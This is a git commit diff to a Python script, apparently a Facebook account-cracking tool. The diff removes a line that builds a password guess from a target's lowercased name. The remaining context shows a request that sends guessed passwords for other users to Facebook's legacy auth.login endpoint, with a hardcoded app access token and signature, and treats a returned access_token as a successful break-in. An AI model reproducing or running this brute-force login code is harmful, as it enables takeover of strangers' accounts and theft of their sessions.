a5d596cf857b4b881826836acf1e620491f1350e
sufyanahma <63979270+sufyanahma@users.noreply.github.com>
2021-10-14 23:13:29 +0500

    Update for-me.py

--- for-me.py
+++ for-me.py
@@ -499,8 +499,7 @@ def choice_action():
 		try:
 			a = session.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
 			b = json.loads(a.text)
-			else:
-		   pass1 = name.lower()+p1   
+			
 			data1 = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q1 = json.loads(data1.text)
 			if "access_token" in q1:
